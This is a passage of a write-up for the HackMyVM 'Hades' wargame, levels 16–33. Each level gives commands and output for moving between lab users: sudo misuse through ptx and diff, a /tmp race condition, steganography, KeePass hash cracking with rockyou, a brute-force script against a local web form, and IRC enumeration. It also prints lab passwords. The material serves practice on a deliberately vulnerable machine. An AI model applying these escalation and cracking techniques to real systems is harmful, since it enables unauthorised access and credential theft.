            # Add that many copies of the current digit (handles cases like finding repeated digits like "111")
            for ((j=0; j<to_add; j++)); do
                correct="${correct}${i}"
            done

            echo -e "${GREEN}[+] Found sequence: $correct${RESET}"
            found=1
            break

        # If we didn't find any new digits, but the count is the same and there's no "NO" response
        elif [ "$ok_count" -eq "$ok_count_prev" ] && ! echo "$result" | grep -q "NO"; then
            correct=$test
            flag=$(tail -1 - <<< $result)
            echo -e "${GREEN}[+] Found sequence: $correct${RESET}"
            echo -e "${YELLOW}[*] Flag: $flag${RESET}"
            found=0
            break
        fi
    done

    # If no new digits were found, we're done
    (( found == 0 )) && { echo -e "${GREEN}[✓] Final: $correct${RESET}"; break; }
done
```

```bash
[*] Flag: YRturIymmHSdBmEClEGe
[✓] Final: 1231239111126
```

> Creds: `aegle:YRturIymmHSdBmEClEGe`

## Level 17

```bash
aegle@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2008(aegle) gid=2008(aegle) groups=2008(aegle)
  1050003      4 -rw-r--r--   1 aegle    aegle         220 Apr 23  2023 ./.bash_logout
  1050004      4 -rw-r--r--   1 aegle    aegle        3526 Apr 23  2023 ./.bashrc
  1050007      4 -rw-r-----   1 root     aegle          22 Apr  5  2024 ./flagz.txt
  1050006      4 -rw-r-----   1 root     calliope       21 Apr  5  2024 ./calliope_pass.txt
  1050008      4 -rw-r-----   1 root     aegle         176 Apr  5  2024 ./mission.txt
  1050005      4 -rw-r--r--   1 aegle    aegle         807 Apr 23  2023 ./.profile
################
# MISSION 0x17 #
################
User calliope likes to have her things looked at.
```

We can't read the password file, but we can get password from flag submission
```bash
aegle@hades:~$ ls -l calliope_pass.txt
-rw-r----- 1 root calliope 21 Apr  5  2024 calliope_pass.txt
aegle@hades:~$ sudo -u calliope /bin/cat ./calliope_pass.txt
/bin/cat: ./calliope_pass.txt: Permission denied
aegle@hades:~$ sudo -u calliope /bin/cat /pwned/calliope/flagz.txt
^rFWOMwBJDidqSNtEJGJ^
```

`id_rsa` exists in this user's directory, so I guess that was intended way. SSH with the key and read the password file.
```bash
  1050117      4 -rw-r-----   1 root     calliope     2592 Apr  5  2024 ./.ssh/id_rsa
```

> Creds: `calliope:IlhyWxZuqIHAuqVOpXfQ`

## Level 18

```bash
calliope@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2009(calliope) gid=2009(calliope) groups=2009(calliope)
  1050112      4 -rw-r--r--   1 calliope calliope      220 Apr 23  2023 ./.bash_logout
  1050113      4 -rw-r--r--   1 calliope calliope     3533 Apr  5  2024 ./.bashrc
  1050116      4 -rw-r-----   1 root     calliope      569 Apr  5  2024 ./.ssh/authorized_keys
  1050117      4 -rw-r-----   1 root     calliope     2592 Apr  5  2024 ./.ssh/id_rsa
  1050118      4 -rw-r-----   1 root     calliope       22 Apr  5  2024 ./flagz.txt
  1050119      4 -rw-r-----   1 root     calliope      175 Apr  5  2024 ./mission.txt
  1050120     16 -r-s--s---   1 root     calliope    16360 Apr  5  2024 ./writeme
  1050114      4 -rw-r--r--   1 calliope calliope      807 Apr 23  2023 ./.profile
################
# MISSION 0x18 #
################
The user calypso often uses write to communicate.
```

```bash
calliope@hades:~$ ./writeme ;echo
Cannot send you my pass!Cannot send you my pass!Cannot send you my pass!Cannot send you my pass!Cannot send you my pass!

calliope@hades:~$ mesg --help

Usage:
 mesg [options] [y | n]

Control write access of other users to your terminal.

Options:
 -v, --verbose  explain what is being done
 -h, --help     display this help
 -V, --version  display version

For more details see mesg(1).

calliope@hades:~$ ./writeme
...pass!TAMYefoHcCPmexwImodo^OCbFzMIKPQOZQMEUKwEi^Cannot send you my pass!
```

By changing the behavior of write we got Password + Hidden Flag

> Creds: `calypso:TAMYefoHcCPmexwImodo`

### Hidden Flag (0xM)

By changing the behavior of write we got Password + Hidden Flag.

## Level 19

```bash
calypso@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2010(calypso) gid=2010(calypso) groups=2010(calypso)
  1050122      4 -rw-r--r--   1 calypso  calypso       220 Apr 23  2023 ./.bash_logout
  1050123      4 -rw-r--r--   1 calypso  calypso      3526 Apr 23  2023 ./.bashrc
  1050125   8524 -rw-r-----   1 root     calypso   8726358 Dec 20  2021 ./cassy.wav
  1050126      4 -rw-r-----   1 root     calypso        22 Apr  5  2024 ./flagz.txt
  1050127      4 -rw-r-----   1 root     calypso       164 Apr  5  2024 ./mission.txt
  1050124      4 -rw-r--r--   1 calypso  calypso       807 Apr 23  2023 ./.profile
################
# MISSION 0x19 #
################
User cassandra always wanted to be on TV.
```

```bash
➜ sshpass -p 'TAMYefoHcCPmexwImodo' scp -P 6666 calypso@hades.hackmyvm.eu:cassy.wav .
```

Make sure to lower the audio and listen to it. What you hear is bunch of garbage to humans, but valuable information to machines. [QSSTV](https://github.com/ON4QZ/QSSTV) can be used to **receive and transmit images over radio using analog SSTV or digital DRM**.

If you're Windows then [Black Cat SSTV](https://www.blackcatsystems.com/software/sstv.html) is alternative.

![hades-1.png](/assets/ctf/hackmyvm/hades-1.png)

Password looked like `CKzlnvmHOz`, but didn't work! The last `O` looks kinda skewed and that's because it's actually `Q`!..

> Creds: `cassandra:CKzlnvmHQz`

## Level 20

```bash
cassandra@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2011(cassandra) gid=2011(cassandra) groups=2011(cassandra)
  1050129      4 -rw-r--r--   1 cassandra cassandra      220 Apr 23  2023 ./.bash_logout
  1050130      4 -rw-r--r--   1 cassandra cassandra     3526 Apr 23  2023 ./.bashrc
  1050132      4 -rw-r-----   1 root      cassandra       22 Apr  5  2024 ./flagz.txt
  1050134      4 -rw-r-----   1 root      cassandra      147 Apr  5  2024 ./mission.txt
  1050133      4 -rw-r-----   1 root      cassandra      369 Apr  5  2024 ./here.txt
  1050131      4 -rw-r--r--   1 cassandra cassandra      807 Apr 23  2023 ./.profile
################
# MISSION 0x20 #
################
User cassiopeia sees the invisible.
```

```bash
cassandra@hades:~$ cat here.txt
VGhlIHBhc3N3b3JkIG9mIGNhc3Npb3BlaWEgaXM6CSAgICAgIAkgICAgCSAgIAkgICAgIAkgICAg
CSAgICAKICAgCSAgICAJICAJICAgIAkgCSAgIAkgICAgICAgCSAgICAJICAgIAoJICAgICAgCQkg
CSAgIAkgICAJICAgIAkgICAgIAkgICAgIAkgIAogICAJIAkgICAgIAkgICAgICAJICAgIAkgICAg
ICAJICAJICAJIAkgICAKICAgCSAgICAgIAkgICAgCSAJICAgICAJICAgICAgCSAgICAJICAgCSAg
ICAgCgkgICAgCSAgICAJIAkgICAgICAJICAgICAJIAkgCSAgICAgICAJIAo=
cassandra@hades:~$ cat here.txt  | base64 -d
The password of cassiopeia is:





cassandra@hades:~$ cat here.txt  | base64 -d | xxd
-bash: xxd: command not found
cassandra@hades:~$ cat here.txt  | base64 -d | hexdump -C
00000000  54 68 65 20 70 61 73 73  77 6f 72 64 20 6f 66 20  |The password of |
00000010  63 61 73 73 69 6f 70 65  69 61 20 69 73 3a 09 20  |cassiopeia is:. |
00000020  20 20 20 20 20 09 20 20  20 20 09 20 20 20 09 20  |     .    .   . |
00000030  20 20 20 20 09 20 20 20  20 09 20 20 20 20 0a 20  |    .    .    . |
00000040  20 20 09 20 20 20 20 09  20 20 09 20 20 20 20 09  |  .    .  .    .|
00000050  20 09 20 20 20 09 20 20  20 20 20 20 20 09 20 20  | .   .       .  |
00000060  20 20 09 20 20 20 20 0a  09 20 20 20 20 20 20 09  |  .    ..      .|
00000070  09 20 09 20 20 20 09 20  20 20 09 20 20 20 20 09  |. .   .   .    .|
00000080  20 20 20 20 20 09 20 20  20 20 20 09 20 20 0a 20  |     .     .  . |
00000090  20 20 09 20 09 20 20 20  20 20 09 20 20 20 20 20  |  . .     .     |
000000a0  20 09 20 20 20 20 09 20  20 20 20 20 20 09 20 20  | .    .      .  |
000000b0  09 20 20 09 20 09 20 20  20 0a 20 20 20 09 20 20  |.  . .   .   .  |
000000c0  20 20 20 20 09 20 20 20  20 09 20 09 20 20 20 20  |    .    . .    |
000000d0  20 09 20 20 20 20 20 20  09 20 20 20 20 09 20 20  | .      .    .  |
000000e0  20 09 20 20 20 20 20 0a  09 20 20 20 20 09 20 20  | .     ..    .  |
000000f0  20 20 09 20 09 20 20 20  20 20 20 09 20 20 20 20  |  . .      .    |
00000100  20 09 20 09 20 09 20 20  20 20 20 20 20 09 20 0a  | . . .       . .|
00000110
```

[https://www.dcode.fr/cipher-identifier](https://www.dcode.fr/cipher-identifier) -> [https://www.dcode.fr/whitespace-language](https://www.dcode.fr/whitespace-language)

If you try decoding it doesn't work, that could only mean that's it's not a cipher but a steganography...

[stegsnow](https://www.kali.org/tools/stegsnow/): This utility can conceal messages in ASCII text by appending whitespaces to the end of lines. Because spaces and tabs are generally not visible in text viewers, the message is effectively hidden from casual observers. And if the built-in encryption is used, the message cannot be read even if it is detected.

Install the tool and decode somewhere
```bash
➜  tmp.fqmhZ5kKx5 stegsnow ws
gRqFnHblmZVZSfegPLvO%   
```

> Cred: `cassiopeia:gRqFnHblmZVZSfegPLvO`

## Level 21

```bash
cassiopeia@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2012(cassiopeia) gid=2012(cassiopeia) groups=2012(cassiopeia)
  1050136      4 -rw-r--r--   1 cassiopeia cassiopeia      220 Apr 23  2023 ./.bash_logout
  1050137      4 -rw-r--r--   1 cassiopeia cassiopeia     3526 Apr 23  2023 ./.bashrc
  1050139      4 -rw-r-----   1 root       cassiopeia       22 Apr  5  2024 ./flagz.txt
  1050140      4 -rw-r-----   1 root       cassiopeia      131 Apr  5  2024 ./mission.txt
  1050138      4 -rw-r--r--   1 cassiopeia cassiopeia      807 Apr 23  2023 ./.profile
################
# MISSION 0x21 #
################
User clio hates spaces.
```

```bash
cassiopeia@hades:~$ sudo -l
Matching Defaults entries for cassiopeia on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User cassiopeia may run the following commands on hades:
    (clio) NOPASSWD: /bin/bash -c /usr/local/src/differences.sh

cassiopeia@hades:~$ cat /usr/local/src/differences.sh
#!/bin/bash
echo File to compare:!
read differences
IFS=0 read file1 file2 <<< "$differences"

if [[ "$differences" =~ \ |\' ]]; then
   echo "No spaces!!"
else
   /usr/bin/diff $file1 $file2
fi
```

This Bash script compares two files using diff, but only if the file names have no spaces in them. 

Since delimiter for filenames is `0` we can just use absolute paths that don't contain spaces.
```bash
cassiopeia@hades:~$ touch /tmp/x
cassiopeia@hades:~$ sudo -u clio /bin/bash -c /usr/local/src/differences.sh
File to compare:!
/tmp/x0/pwned/clio/flagz.txt
0a1
> ^XUJbvPwAZYgoUgkpeSv^
```

> Cred: `clio:cqJqRPaUtuoUYXbaxnZq`

## Level 22

```bash
clio@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2013(clio) gid=2013(clio) groups=2013(clio)
  1050142      4 -rw-r--r--   1 clio     clio          220 Apr 23  2023 ./.bash_logout
  1050143      4 -rw-r--r--   1 clio     clio         3526 Apr 23  2023 ./.bashrc
  1050145      4 -rw-r-----   1 root     clio           22 Apr  5  2024 ./flagz.txt
  1050146      4 -rw-r-----   1 root     clio          169 Apr  5  2024 ./mission.txt
  1050144      4 -rw-r--r--   1 clio     clio          807 Apr 23  2023 ./.profile
################
# MISSION 0x22 #
################
The user cybele uses her lastname as a password.
```

```bash
clio@hades:~$ grep cybele /etc/passwd
cybele:x:2014:2014:UICacOPmJMWbKyPwNZod:/pwned/cybele:/bin/bash
```

> Creds: `cybele:UICacOPmJMWbKyPwNZod`

## Level 23

```bash
cybele@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2014(cybele) gid=2014(cybele) groups=2014(cybele)
  1050148      4 -rw-r--r--   1 cybele   cybele        220 Apr 23  2023 ./.bash_logout
  1050149      4 -rw-r--r--   1 cybele   cybele       3526 Apr 23  2023 ./.bashrc
  1050152   3188 -rw-r-----   1 root     cybele    3263057 Dec 30  2021 ./fun.png
  1050151      4 -rw-r-----   1 root     cybele         22 Apr  5  2024 ./flagz.txt
  1050153      4 -rw-r-----   1 root     cybele        163 Apr  5  2024 ./mission.txt
  1050150      4 -rw-r--r--   1 cybele   cybele        807 Apr 23  2023 ./.profile
################
# MISSION 0x23 #
################
User cynthia sees things that others dont.
```

```bash
➜ sshpass -p 'UICacOPmJMWbKyPwNZod' scp -P 6666 cybele@hades.hackmyvm.eu:fun.png .
```

![hades-2.png](/assets/ctf/hackmyvm/hades-2.png)

The mission is hinting at **Steganography**, we can use **Stegsolve** to inspect different layers of PNG, cycling through the layers **Red Plane 0** reveals hidden password.

![hades-3.png](/assets/ctf/hackmyvm/hades-3.png)

> Creds: `cynthia:QHLjXdGSiRShtWpMwFjj`

## Level 24

```bash
cynthia@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2015(cynthia) gid=2015(cynthia) groups=2015(cynthia)
  1050155      4 -rw-r--r--   1 cynthia  cynthia       220 Apr 23  2023 ./.bash_logout
  1050156      4 -rw-r--r--   1 cynthia  cynthia      3526 Apr 23  2023 ./.bashrc
  1050158      4 -rw-r-----   1 root     cynthia        22 Apr  5  2024 ./flagz.txt
  1050159      4 -rw-r-----   1 root     cynthia       187 Apr  5  2024 ./mission.txt
  1050157      4 -rw-r--r--   1 cynthia  cynthia       807 Apr 23  2023 ./.profile
################
# MISSION 0x24 #
################
User daphne once told us: Gemini? gem-evil.hmv? WTF?
```

[Gemini](https://en.wikipedia.org/wiki/Gemini_\(protocol\) "wikipedia:Gemini (protocol)") is a new (*not Google AI*), collaboratively designed internet protocol, which explores the space inbetween [gopher](https://wiki.archlinux.org/title/Gopher "Gopher") and the web, striving to address (perceived) limitations of one while avoiding the (undeniable) pitfalls of the other.

There's no such domain on machine
```bash
cynthia@hades:~$ grep hmv /etc/hosts
127.0.0.1       hades.hmv
127.0.0.1       whatsmypass.hmv
```

The default port for this protocol is **1965**:
```bash
cynthia@hades:~$ /var/tmp/busybox netstat -altpn | grep 1965
tcp        0      0 :::1965                 :::*                    LISTEN      -
```


```bash
└─$ sshpass -p 'QHLjXdGSiRShtWpMwFjj' ssh hades.hackmyvm.eu -p 6666 -l cynthia -L 1965:0:1965
---
└─$ sudo apt install amphora
└─$ amfora gem-evil.hmv # Doesn't work
└─$ sudo nano /etc/hosts # Add DNS record
127.0.0.1       gem-evil.hmv
└─$ amfora gem-evil.hmv
# Welcome to mi Gemini Server!
## What are you looking for?
EkdtKuXCJjlFKFpKgddX
```

> Creds: `daphne:EkdtKuXCJjlFKFpKgddX`

## Level 25

```bash
daphne@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2016(daphne) gid=2016(daphne) groups=2016(daphne)
  1050161      4 -rw-r--r--   1 daphne   daphne        220 Apr 23  2023 ./.bash_logout
  1050162      4 -rw-r--r--   1 daphne   daphne       3526 Apr 23  2023 ./.bashrc
  1050164      4 -rw-r-----   1 root     daphne         22 Apr  5  2024 ./flagz.txt
  1050166      4 -rw-r-----   1 root     daphne        174 Apr  5  2024 ./old.sh
  1050165      4 -rw-r-----   1 root     daphne        272 Apr  5  2024 ./mission.txt
  1050163      4 -rw-r--r--   1 daphne   daphne        807 Apr 23  2023 ./.profile
################
# MISSION 0x25 #
################
The user delia has a good memory, she only has to see her password for a few seconds to remember it.
```

This Bash script temporarily writes a secret (password) to a file, exposes it via a file descriptor, then deletes the file shortly after.
```bash
daphne@hades:~$ cat old.sh
#!/bin/bash
#OUTPUT="PASSWORD_DELIA" <-- UPDATE IT!
secretfile=$(mktemp /tmp/XXX)
chmod 664 "$secretfile"
exec 5>"$secretfile"
echo $OUTPUT >&5
sleep 0.01
rm "$secretfile"

daphne@hades:~$ sudo -l
Matching Defaults entries for daphne on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User daphne may run the following commands on hades:
    (delia) NOPASSWD: /bin/bash -c /usr/local/src/new.sh
```

`mktemp /tmp/XXX` command creates temporary file with pattern of `/tmp/XXX`, X is any alphanumeric symbol. We first start by filling up `/tmp` directory with random files owned by us and prevent `mktemp` to create any.
```bash
#!/bin/bash

chars=({a..z} {A..Z} {0..9})

for c1 in "${chars[@]}"; do
  for c2 in "${chars[@]}"; do
    for c3 in "${chars[@]}"; do
      touch "/tmp/${c1}${c2}${c3}"
    done
  done
done
```

Once we are done overfilling remove 1 random file. Execute the bash script and start spamming cat command to read it as soon as possible.
```bash
daphne@hades:~$ rm /tmp/bbb

daphne@hades:~$ (for i in {1..50}; do cat /tmp/bbb; sleep 0.001 & done) &
(sudo -u delia /bin/bash -c /usr/local/src/new.sh) &
...
cat: /tmp/bbb: No such file or directory
cat: /tmp/bbb: No such file or directory
cat: /tmp/bbb: Permission denied
bNCvocyOpoMVeCtxrhTt
bNCvocyOpoMVeCtxrhTt
bNCvocyOpoMVeCtxrhTt
^C
[1]-  Done                    ( for i in {1..50};
do
    cat /tmp/bbb; sleep 0.001 &
done )
[2]+  Done                    ( sudo -u delia /bin/bash -c /usr/local/src/new.sh )
```

> Creds: `delia:bNCvocyOpoMVeCtxrhTt`

## Level 26

Once we login we get weird symbols all over the place, usually `reset` command fixes this issue but we don't have permission. Luckily there's busybox as alternative.
```bash
delia@hades:~$ /var/tmp/busybox reset # Resets shell to normal

delia@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2017(delia) gid=2017(delia) groups=2017(delia)
  1050168      4 -rw-r--r--   1 delia    delia         220 Apr 23  2023 ./.bash_logout
  1050169      4 -r--r-----   1 delia    delia        3539 Apr  5  2024 ./.bashrc
  1050173     16 ---x--x---   1 delia    delia       15952 Apr  5  2024 ./showpass
  1050171      4 -rw-r-----   1 root     delia          22 Apr  5  2024 ./flagz.txt
  1050172      4 -rw-r-----   1 root     delia         150 Apr  5  2024 ./mission.txt
  1050170      4 -rw-r--r--   1 delia    delia         807 Apr 23  2023 ./.profile
################
# MISSION 0x26 #
################
User demeter reads in another language.
```

Pretty easy since `bustbox` fixed the terminal.
```bash
delia@hades:~$ ./showpass
FkyuXkkJNONDChoaKzOI
```

> **Note**: `tput reset` also worked.

> Creds: `demeter:FkyuXkkJNONDChoaKzOI`

## Level 27

```bash
demeter@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2018(demeter) gid=2018(demeter) groups=2018(demeter)
  1050175      4 -rw-r--r--   1 demeter  demeter       220 Apr 23  2023 ./.bash_logout
  1050176      4 -rw-r--r--   1 demeter  demeter      3526 Apr 23  2023 ./.bashrc
  1050178      4 -rw-r-----   1 root     demeter        22 Apr  5  2024 ./flagz.txt
  1050179      4 -rw-r-----   1 root     demeter       119 Apr  5  2024 ./mission.txt
  1050177      4 -rw-r--r--   1 demeter  demeter       807 Apr 23  2023 ./.profile
################
# MISSION 0x27 #
################
The user echo permute.
```

[https://gtfobins.github.io/gtfobins/ptx/](https://gtfobins.github.io/gtfobins/ptx/)

```bash
demeter@hades:~$ sudo -l
Matching Defaults entries for demeter on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User demeter may run the following commands on hades:
    (echo) NOPASSWD: /usr/bin/ptx
```

```bash
demeter@hades:~$ sudo -u echo ptx /pwned/echo/flagz.txt
                                   ^   abeDeOxlPMAABepeBHy^
```

> Creds: `echo:GztROerShmiyiCIlfepG`

## Level 28

```bash
echo@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2019(echo) gid=2019(echo) groups=2019(echo)
  1050181      4 -rw-r--r--   1 echo     echo          220 Apr 23  2023 ./.bash_logout
  1050182      4 -rw-r--r--   1 echo     echo         3526 Apr 23  2023 ./.bashrc
  1050184      4 -rw-r-----   1 root     echo           22 Apr  5  2024 ./flagz.txt
  1050185      4 -rw-r-----   1 root     echo          142 Apr  5  2024 ./mission.txt
  1050186    436 -rw-r-----   1 root     echo       442848 Dec 20  2021 ./noise.wav
  1050183      4 -rw-r--r--   1 echo     echo          807 Apr 23  2023 ./.profile
################
# MISSION 0x28 #
################
The user eos can see the sounds.
```

```bash
└─$ sshpass -p 'GztROerShmiyiCIlfepG' scp -P 6666 echo@hades.hackmyvm.eu:noise.wav .
```

The audio is garbage to humans. One common technique is to analyze the Spectrum: [https://academo.org/demos/spectrum-analyzer/](https://academo.org/demos/spectrum-analyzer/)

![hades-4.png](/assets/ctf/hackmyvm/hades-4.png)

> Creds: `eos:CWBKRQX`

## Level 29

```bash
eos@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2020(eos) gid=2020(eos) groups=2020(eos)
  1050188      4 -rw-r--r--   1 eos      eos           220 Apr 23  2023 ./.bash_logout
  1050193      4 -r-xr-x---   1 root     eos          1902 Apr  5  2024 ./secretz.kbdx
  1050189      4 -rw-r--r--   1 eos      eos          3526 Apr 23  2023 ./.bashrc
  1050191      4 -rw-r-----   1 root     eos            22 Apr  5  2024 ./flagz.txt
  1050192      4 -rw-r-----   1 root     eos           181 Apr  5  2024 ./mission.txt
  1050190      4 -rw-r--r--   1 eos      eos           807 Apr 23  2023 ./.profile
################
# MISSION 0x29 #
################
The user gaia is very careful saving her passwords.
```

```bash
└─$ sshpass -p 'CWBKRQX' scp -P 6666 eos@hades.hackmyvm.eu:secretz.kbdx .
└─$ keepass2john secretz.kbdx
secretz.kbdx:$keepass$*2*60000*0*a1d26fcac0353f510e1221e8572fee58deec14d35122b9d2975389bb2f5de3e8*9da1c2694ce8f7049d9ea01edb5c4b96438f4b50f81ad47a9c8bb0d6a2f21675*5270e786b0205ce584d44e32574cc305*a36e759f9705374aa4b9f6c055247366e486440cb21c0a1ddc0f3be8d413840d*7f7e1dc3ff3fb144e6cfc6b0a71e77109fe2c1aa9dbb366f83523cda2ae68383
---
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
heaven           (secretz.kbdx)
```

![hades-5.png](/assets/ctf/hackmyvm/hades-5.png)

> Creds: `gaia:sbUcegcdYTTWzTKojzgm`

## Level 30

```bash
gaia@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2021(gaia) gid=2021(gaia) groups=2021(gaia)
  1050199      4 -rw-r--r--   1 gaia     gaia          220 Apr 23  2023 ./.bash_logout
  1050200      4 -rw-r--r--   1 gaia     gaia         3526 Apr 23  2023 ./.bashrc
  1050204      4 -rw-r-----   1 root     powah          23 Apr  5  2024 ./hpass2.txt
  1050202      4 -rw-r-----   1 root     gaia           22 Apr  5  2024 ./flagz.txt
  1050205      4 -rw-r-----   1 root     gaia          146 Apr  5  2024 ./mission.txt
  1050203      4 -rw-r-----   1 root     gaia           10 Apr  5  2024 ./hpass1.txt
  1050201      4 -rw-r--r--   1 gaia     gaia          807 Apr 23  2023 ./.profile
################
# MISSION 0x30 #
################
User halcyon wants all the powah.
```

```bash
gaia@hades:~$ cat hpass*
manuela
cat: hpass2.txt: Permission denied
```

This user doesn't exist, but groups does
```bash
gaia@hades:~$ grep powah /etc/passwd
```

The groups just like users may have passwords, oddly enough.
```bash
gaia@hades:~$ sg
Usage: sg group [[-c] command]
gaia@hades:~$ sg powah -c id
Password: sbUcegcdYTTWzTKojzgm
Invalid password.
gaia@hades:~$ sg powah -c id
Password: manuela
uid=2021(gaia) gid=1000(powah) groups=1000(powah),2021(gaia)
```

The password we got from first file is a password for the group!
```bash
gaia@hades:~$ sg powah -c 'cat /pwned/gaia/hpass2.txt'
Password: manuela
cuMRRameGdmhVxHcYYYs
```

> Creds: `halcyon:cuMRRameGdmhVxHcYYYs`

`newgrp` command can also be used to spawn shell as that group.
```bash
gaia@hades:~$ newgrp powah
Password:
gaia@hades:~$ id
uid=2021(gaia) gid=1000(powah) groups=1000(powah),2021(gaia)
```

## Level 31

```bash
halcyon@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2022(halcyon) gid=2022(halcyon) groups=2022(halcyon)
  1050223      4 -rw-r--r--   1 halcyon  halcyon       220 Apr 23  2023 ./.bash_logout
  1050224      4 -rw-r--r--   1 halcyon  halcyon      3526 Apr 23  2023 ./.bashrc
  1050226      4 -rw-r-----   1 root     halcyon        22 Apr  5  2024 ./flagz.txt
  1050227      4 -rw-r-----   1 root     halcyon       252 Apr  5  2024 ./mission.txt
  1050225      4 -rw-r--r--   1 halcyon  halcyon       807 Apr 23  2023 ./.profile
################
# MISSION 0x31 #
################
The user hebe has one 'magicword' to get her password using http://localhost/req.php
```

So first we need a wordlist,  so I thought we could use rockyou
```bash
halcyon@hades:~$ find / -name 'rockyou*.txt' 2>/dev/null
/var/tmp/rockyou-25.txt
/var/tmp/rock/rockyou.txt
```

```python
import asyncio
import sys
from urllib.request import urlopen
from urllib.parse import urlencode

HOST = '127.0.0.1'
PATH = '/req.php'
FAILED = 'NO...'

with open(sys.argv[1], encoding='latin-1') as f:
    wordlist = f.read().split('\n')

def try_word(word):
    try:
        query = urlencode({'magicword': word})
        url = f"http://{HOST}{PATH}?{query}"
        
        with urlopen(url, timeout=3) as response:
            body = response.read().decode(errors='ignore')
        
        if FAILED not in body:
            return f"[+] Found: {word} | Response: {body.strip()}"
    except Exception as e:
        print(f"[!] Error on '{word}': {e}")
    
    return

async def main():
    loop = asyncio.get_event_loop()
    
    for word in wordlist:
        result = await loop.run_in_executor(None, try_word, word)
        if result:
            print(result)
            break

if __name__ == '__main__':
    asyncio.run(main())
```

Brute
```bash
halcyon@hades:~$ nano /tmp/b.py
halcyon@hades:~$ python3 /tmp/b.py /var/tmp/rockyou-25.txt
[+] Found: password | Response: tOlbuBLjFWntVDNmjHIG
```

> Creds: `hebe:tOlbuBLjFWntVDNmjHIG`

## Level 32

```bash
hebe@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2023(hebe) gid=2023(hebe) groups=2023(hebe)
  1050229      4 -rw-r--r--   1 hebe     hebe          220 Apr 23  2023 ./.bash_logout
  1050230      4 -rw-r--r--   1 hebe     hebe         3526 Apr 23  2023 ./.bashrc
  1050232      4 -rw-r-----   1 root     hebe           22 Apr  5  2024 ./flagz.txt
  1050233      4 -rw-r-----   1 root     hebe          232 Apr  5  2024 ./mission.txt
  1050231      4 -rw-r--r--   1 hebe     hebe          807 Apr 23  2023 ./.profile
################
# MISSION 0x32 #
################
User hera refuses to use Discord, she prefer an older and open source service.
```

Number three, never trust nobody  
[IRC](https://genius.com/15803270/Dual-core-0x0a-hack-commandments/Irc) is bad luck when you chat too much

Default port is 6667
```bash
hebe@hades:~$ /var/tmp/busybox netstat -altnp | grep 6667
tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -
```

You could do port forwarding and explore the channel in depth, but when we list the channels we get password.
```bash
hebe@hades:~$ /var/tmp/busybox nc 0 6667
:hades.hmv NOTICE * :*** Looking up your hostname...
:hades.hmv NOTICE * :*** Could not resolve your hostname: Request timed out; using your IP address (127.0.0.1) instead.
NICK hera # Typed 
USER hera 0 * :Real Name # Typed
:hades.hmv 001 hera :Welcome to the Devilnet IRC Network hera!hera@127.0.0.1
:hades.hmv 002 hera :Your host is hades.hmv, running version InspIRCd-3
:hades.hmv 003 hera :This server was created 08:43:58 Feb 23 2025
:hades.hmv 004 hera hades.hmv InspIRCd-3 iosw Pbiklmnopstv :bklov
:hades.hmv 005 hera AWAYLEN=200 CASEMAPPING=rfc1459 CHANLIMIT=#:20 CHANMODES=b,k,l,Pimnpst CHANNELLEN=64 CHANTYPES=# ELIST=CMNTU HOSTLEN=64 KEYLEN=32 KICKLEN=255 LINELEN=512 MAXLIST=b:100 :are supported by this server
:hades.hmv 005 hera MAXTARGETS=20 MODES=20 NAMELEN=128 NETWORK=Devilnet NICKLEN=30 PREFIX=(ov)@+ SAFELIST STATUSMSG=@+ TOPICLEN=307 USERLEN=10 USERMODES=,,s,iow WHOX :are supported by this server
:hades.hmv 251 hera :There are 0 users and 0 invisible on 1 servers
:hades.hmv 253 hera 1 :unknown connections
:hades.hmv 254 hera 1 :channels formed
:hades.hmv 255 hera :I have 0 clients and 0 servers
:hades.hmv 265 hera :Current local users: 0  Max: 2
:hades.hmv 266 hera :Current global users: 0  Max: 2
:hades.hmv 375 hera :hades.hmv message of the day
:hades.hmv 372 hera :
:hades.hmv 372 hera :**************************************************
:hades.hmv 372 hera :*             H    E    L    L    O              *
:hades.hmv 372 hera :*                                                   *
:hades.hmv 372 hera :*        Welcome to  Evil IRC.              *
:hades.hmv 372 hera :*                                                   *
:hades.hmv 372 hera :**************************************************
:hades.hmv 372 hera :
:hades.hmv 376 hera :End of message of the day.
LIST # Typed
:hades.hmv 321 hera Channel :Users Name
:hades.hmv 322 hera #channel666 0 :[+Pnt] Welcome hacker! Take it: JzpyRXRzWoHKZwgWzleM
:hades.hmv 323 hera :End of channel list.
```

> Creds: `hera:JzpyRXRzWoHKZwgWzleM`

## Level 33

```bash
hera@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2024(hera) gid=2024(hera) groups=2024(hera)
  1050235      4 -rw-r-----   1 root     hera          127 Apr  5  2024 ./.bash_history
  1050236      4 -rw-r--r--   1 hera     hera          220 Apr 23  2023 ./.bash_logout
  1050237      4 -rw-r--r--   1 hera     hera         3526 Apr 23  2023 ./.bashrc
  1050240      4 -rw-r-----   1 root     hera          568 Apr  5  2024 ./.ssh/authorized_keys
  1050241      4 -rw-r-----   1 root     hera         2590 Apr  5  2024 ./.ssh/id_rsa
